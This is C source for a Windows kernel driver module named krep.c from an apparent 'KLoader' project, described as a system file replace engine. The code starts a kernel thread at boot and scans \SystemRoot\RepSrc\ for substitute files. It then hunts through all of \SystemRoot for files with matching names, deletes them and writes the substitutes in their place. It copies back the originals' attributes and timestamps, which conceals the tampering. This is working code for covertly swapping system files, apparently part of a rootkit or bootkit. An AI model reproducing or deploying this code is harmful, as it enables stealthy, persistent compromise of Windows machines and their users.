//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KLoader project
//	
// module: 
//	krep.c
// created: 
//	may 2011
// description: 
//	System file replace engine.
//	Scans Replace Source directory to and replaces apropriate files within system folder.
//	Sets notification on replaced files change, and restores them in case if they were changed.

#include <ntddk.h>
#include "ntddkex.h"
#include "krep.h"

#define __ascii_towlower(c)     ( (((c) >= L'A') && ((c) <= L'Z')) ? ((c) - L'A' + L'a') : (c) )

#define		wczSystemRoot			L"\\SystemRoot\\"
#define		wczReplaceSourceDir		L"RepSrc\\"
#define		wczMaskAll				L"*"
#define		wczCheckKey				L"\\REGISTRY\\Machine\\SYSTEM\\ControlSet001\\Control\\hivelist"
#define		wczCheckValue			L"\\REGISTRY\\MACHINE\\SAM"
#define		wczSystem32				L"system32"



/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Compare string with wildcast ignore case.
//
int __cdecl __wcswicmp(const WCHAR *wild, const WCHAR *string) 
{
	const WCHAR *cp = NULL, *mp = NULL;
	
	while ((*string) && (*wild != '*')) 
	{
		if ((__ascii_towlower(*wild) != __ascii_towlower(*string)) && (*wild != '?')) 
			return 0;
		wild++;
		string++;
	}
	
	while (*string) 
	{
		if (*wild == '*') 
		{
			if (!*++wild) 
				return 1;
			mp = wild;
			cp = string+1;
		} 
		else if ((__ascii_towlower(*wild) == __ascii_towlower(*string)) || (*wild == '?')) 
		{
			wild++;
			string++;
		} 
		else 
		{
			wild = mp;
			string = cp++;
		}
	}	// while (*string) 
	
	while (*wild == '*')
		wild++;

  return !*wild;
}


// --- File directory entry -----------------------------------------------------------------------------------------------

//
//	Allocates and initializes new FILE_DIRECTORY_ENTRY structure
PFILE_DIRECTORY_ENTRY	FilesAlocateDirEntry(ULONG NameLength)
{
	PFILE_DIRECTORY_ENTRY	DirEntry = ExAllocatePoolWithTag(PagedPool, sizeof(FILE_DIRECTORY_ENTRY) + NameLength, TAG_FILE_DIRECTORY_ENTRY);
	if (DirEntry)
	{
		RtlFillMemory(DirEntry, sizeof(FILE_DIRECTORY_ENTRY) + NameLength, 0);
#if DBG
		DirEntry->Magic = FILE_DIRECTORY_ENTRY_MAGIC;
#endif
		InitializeListHead(&DirEntry->Entry);
	}	// if (DirEntry)
	return(DirEntry);
}

//
//	Releases and frees FILE_DIRECTORY_ENTRY structure
VOID	FilesFreeDirEntry(PFILE_DIRECTORY_ENTRY DirEntry)
{
	ASSERT_FILE_DIRECTORY_ENTRY(DirEntry);
	ExFreePool(DirEntry);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches for files according to specified Mask starting from specified Path. Links all found into the FileListHead.
//	Returns number of files found.
//
ULONG	FilesFind(
		  PWCHAR			Directory,		// directory name to search in
		  PWCHAR			Mask,			// search mask
  		  ULONG				Flags,			// variouse flags		
		  PLIST_ENTRY		FileListHead	// result list of file descriptors
		  )
{
	ULONG	bSize, Found = 0;
	HANDLE	hDir;
	NTSTATUS	ntStatus;
	UNICODE_STRING		uDirectory;
	OBJECT_ATTRIBUTES	oa = {0};
	IO_STATUS_BLOCK		IoStatus = {0};
	PFILE_DIRECTORY_INFORMATION	FileInfo, CurInfo;
	PFILE_DIRECTORY_ENTRY		DirEntry;
	ULONG	DirLenBytes = wcslen(Directory) * sizeof(WCHAR);

	RtlInitUnicodeString(&uDirectory, Directory);
	InitializeObjectAttributes(&oa, &uDirectory, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

	ntStatus = ZwCreateFile(&hDir, GENERIC_READ, &oa, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if (NT_SUCCESS(ntStatus))
	{
		if (FileInfo = ExAllocatePool(PagedPool, PAGE_SIZE))
		{
			do
			{
				ntStatus = ZwQueryDirectoryFile(hDir, NULL, NULL, 0, &IoStatus, FileInfo, PAGE_SIZE - sizeof(WCHAR), FileDirectoryInformation, FALSE, NULL, FALSE);
				if (NT_SUCCESS(ntStatus))
				{
					CurInfo = FileInfo;
					do 
					{
						if (CurInfo->FileName[0] != '.')
						{
							if (!(CurInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) || (Flags & FILES_FIND_DIRECTORIES))
							{
								ULONG	NameLen = CurInfo->FileNameLength >> 1;
								WCHAR	z = CurInfo->FileName[NameLen];
								CurInfo->FileName[NameLen] = 0;

								if (__wcswicmp(Mask, (PWCHAR)&CurInfo->FileName))
								{
									if (DirEntry = FilesAlocateDirEntry(DirLenBytes + CurInfo->FileNameLength))
									{
										RtlCopyMemory(&DirEntry->FileInfo, CurInfo, sizeof(FILE_DIRECTORY_INFORMATION));
										RtlCopyMemory(&DirEntry->FileInfo.FileName, Directory, DirLenBytes);
										RtlCopyMemory(&DirEntry->FileInfo.FileName[DirLenBytes >> 1], &CurInfo->FileName, CurInfo->FileNameLength);
										InsertTailList(FileListHead, &DirEntry->Entry);
										Found += 1;
									}
								}	// if (__wcswicmp(Mask, (PWCHAR)&CurInfo->FileName))
								CurInfo->FileName[NameLen] = z;
							}	// if (!(CurInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) || (Flags & FILES_FIND_DIRECTORIES))

							if ((CurInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) && (Flags & FILES_SCAN_SUBDIRECTORIES))
							{
								PWCHAR	NewDir = ExAllocatePool(PagedPool, DirLenBytes + CurInfo->FileNameLength + 2*sizeof(WCHAR));
								if (NewDir)
								{
									RtlCopyMemory(NewDir, Directory, DirLenBytes);
									RtlCopyMemory((PCHAR)NewDir + DirLenBytes, CurInfo->FileName, CurInfo->FileNameLength);
									NewDir[(DirLenBytes + CurInfo->FileNameLength) >> 1] = '\\';
									NewDir[(DirLenBytes + CurInfo->FileNameLength + sizeof(WCHAR)) >> 1] = 0;
									Found += FilesFind(NewDir, Mask, Flags, FileListHead);
									ExFreePool(NewDir);
								}
							}	// if ((CurInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) && (Flags & FILES_SCAN_SUBDIRECTORIES))
						}	// if (CurInfo->FileName[0] != '.')

						if (CurInfo->NextEntryOffset == 0)
							break;
						CurInfo = (PFILE_DIRECTORY_INFORMATION)((PCHAR)CurInfo + CurInfo->NextEntryOffset);
					} while(TRUE);
				}	// if (NT_SUCCESS(ntStatus))
			} while(NT_SUCCESS(ntStatus));			
			ExFreePool(FileInfo);
		}	// if (FileInfo = ExAllocatePool(PagedPool, PAGE_SIZE))
		ZwClose(hDir);
	}	// if (NT_SUCCESS(ntStatus))
	return(Found);
}


VOID	FilesListRelease(PLIST_ENTRY FilesList)
{
	PLIST_ENTRY pEntry = FilesList->Flink;
	while(pEntry != FilesList)
	{
		PFILE_DIRECTORY_ENTRY DirEntry = CONTAINING_RECORD(pEntry, FILE_DIRECTORY_ENTRY, Entry);
		pEntry = pEntry->Flink;
		RemoveEntryList(&DirEntry->Entry);
		FilesFreeDirEntry(DirEntry);
	}
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Replaces content of DestFile with content of SourceFile.
//	Restores original file attributes and times.
//	
NTSTATUS	ReplaceFile(PWCHAR DestFile, PWCHAR SourceFile)
{
	UNICODE_STRING		uSource = {0};
	UNICODE_STRING		uDest = {0};
	OBJECT_ATTRIBUTES	oa = {0};
	IO_STATUS_BLOCK		IoStatus = {0};
	NTSTATUS	ntStatus = 0;
	HANDLE		hSource = 0, hDest = 0;
	FILE_BASIC_INFORMATION		BasicInfo = {0};
	FILE_STANDARD_INFORMATION	StdInfo = {0};
	PCHAR		Buffer = NULL;
	ULONG		bRead;

	RtlInitUnicodeString(&uSource, SourceFile);
	RtlInitUnicodeString(&uDest, DestFile);

	do	// not a loop
	{
		InitializeObjectAttributes(&oa, &uSource, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

		ntStatus = ZwCreateFile(&hSource, GENERIC_READ, &oa, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL, 
			FILE_SHARE_READ, FILE_OPEN,	FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,	NULL, 0);

		if (!NT_SUCCESS(ntStatus))
			break;

		InitializeObjectAttributes(&oa, &uDest, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

		ntStatus = ZwCreateFile(&hDest,	GENERIC_READ, &oa, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL, 
			FILE_SHARE_READ, FILE_OPEN,	FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,	NULL, 0);

		if (!NT_SUCCESS(ntStatus))
			break;

		ntStatus = ZwQueryInformationFile(hDest, &IoStatus, &BasicInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation);
		ZwClose(hDest);
		hDest = 0;

		if (!NT_SUCCESS(ntStatus))
			break;
		
		if (!NT_SUCCESS(ntStatus = ZwDeleteFile(&oa)))
			break;

		ntStatus = ZwQueryInformationFile(hSource, &IoStatus, &StdInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
		if (!NT_SUCCESS(ntStatus))
			break;

		if (!(Buffer = ExAllocatePool(PagedPool, StdInfo.EndOfFile.LowPart)))
		{
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		ntStatus = ZwReadFile(hSource, 0, NULL, NULL, &IoStatus, Buffer, StdInfo.EndOfFile.LowPart, NULL, 0);
		if (!NT_SUCCESS(ntStatus))
			break;

		ntStatus = ZwCreateFile(&hDest,	GENERIC_WRITE, &oa, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL, 
			FILE_SHARE_READ, FILE_OPEN_IF,	FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,	NULL, 0);

		if (!NT_SUCCESS(ntStatus))
			break;

		ntStatus = ZwWriteFile(hDest, 0, NULL, NULL, &IoStatus, Buffer, StdInfo.EndOfFile.LowPart, NULL, 0);
		if (!NT_SUCCESS(ntStatus))
			break;

		ntStatus = ZwSetInformationFile(hDest, &IoStatus, &BasicInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation);

	}while(FALSE);

	if (Buffer)
		ExFreePool(Buffer);

	if (hDest)
		ZwClose(hDest);
	if (hSource)
		ZwClose(hSource);

	return(ntStatus);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Scans replace source directory for files to replace. If some files found, scans \SystemRoot to find and replace 
//	 all files with the same name. Returns number of files replaced.
//
ULONG	CheckReplaceFiles(VOID)
{
	NTSTATUS	ntStatus;
	OBJECT_ATTRIBUTES	oa = {0};
	UNICODE_STRING		us = {0};
	IO_STATUS_BLOCK		IoStatus = {0};
	PWCHAR		PathBuffer;
	LIST_ENTRY	SourceFiles = {&SourceFiles, &SourceFiles};
	LIST_ENTRY	ReplaceFiles = {&ReplaceFiles, &ReplaceFiles};
	ULONG		i, FilesToReplace, Count = 0;
	PLIST_ENTRY	pEntry, pEntry1;

	PathBuffer = ExAllocatePoolWithTag(PagedPool, (cstrlenW(wczSystemRoot) + cstrlenW(wczReplaceSourceDir) + 1) * sizeof(WCHAR), 0);
	if (PathBuffer)
	{
		wcscpy(PathBuffer, wczSystemRoot);
		wcscat(PathBuffer, wczReplaceSourceDir);
		RtlInitUnicodeString(&us, PathBuffer);

		FilesToReplace = FilesFind(PathBuffer, wczMaskAll, 0, &SourceFiles);
		pEntry = SourceFiles.Flink;
		for (i=0; i<FilesToReplace; i++)
		{
			PFILE_DIRECTORY_ENTRY	SourceEntry = CONTAINING_RECORD(pEntry, FILE_DIRECTORY_ENTRY, Entry);
			PWCHAR	NameMask = wcsrchr(SourceEntry->FileInfo.FileName, '\\') + 1;
			ULONG	RepCount;

			pEntry = pEntry->Flink;
			RepCount = FilesFind(wczSystemRoot, NameMask, FILES_SCAN_SUBDIRECTORIES, &ReplaceFiles);
			pEntry1 = ReplaceFiles.Flink;
			while(pEntry1 != &ReplaceFiles)
			{
				PFILE_DIRECTORY_ENTRY	DestEntry = CONTAINING_RECORD(pEntry1, FILE_DIRECTORY_ENTRY, Entry);
				pEntry1 = pEntry1->Flink;
				RemoveEntryList(&DestEntry->Entry);
				ntStatus = ReplaceFile((PWCHAR)&DestEntry->FileInfo.FileName, (PWCHAR)&SourceEntry->FileInfo.FileName);
				if (NT_SUCCESS(ntStatus))
					Count += 1;
				FilesFreeDirEntry(DestEntry);
			}	// while(pEntry1 != &ReplaceFiles)			
		}	// for (i=0; i<Count; i++)
		ExFreePool(PathBuffer);
	}	// if (PathBuffer)
	return(Count);
}


VOID	FileReplaceThread(PVOID	Context)
{
	NTSTATUS	ntStatus;
	UNICODE_STRING	uDirectory = {0};
	IO_STATUS_BLOCK	IoStatus = {0};
	OBJECT_ATTRIBUTES	oa = {0};
	LARGE_INTEGER		Interval;
	HANDLE				hDir;

	Interval.QuadPart = _RELATIVE(_MILLISECONDS(100));

	RtlInitUnicodeString(&uDirectory, wczSystemRoot);
	InitializeObjectAttributes(&oa, &uDirectory, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

	// Since our driver coud be started early at system startup, there could be no file system yet.
	// Trying to open SystemRoot folder in a loop with a delay to wait until file system is ready.
	do 
	{
		KeDelayExecutionThread(KernelMode, TRUE, &Interval);
		ntStatus = ZwCreateFile(&hDir, GENERIC_READ, &oa, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, 
			FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	} while(!NT_SUCCESS(ntStatus));

	ZwClose(hDir);

	// File System is ready. Replacing files.
	CheckReplaceFiles();
}


// Create file replace thread.
NTSTATUS	InitializeReplace(VOID)
{
	HANDLE		hThread;
	NTSTATUS	ntStatus;
	OBJECT_ATTRIBUTES	oa = {0};

	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	ntStatus = PsCreateSystemThread(&hThread, GENERIC_ALL, &oa, NULL, NULL, &FileReplaceThread, NULL);
	if (NT_SUCCESS(ntStatus))
		ZwClose(hThread);
	return(ntStatus);
}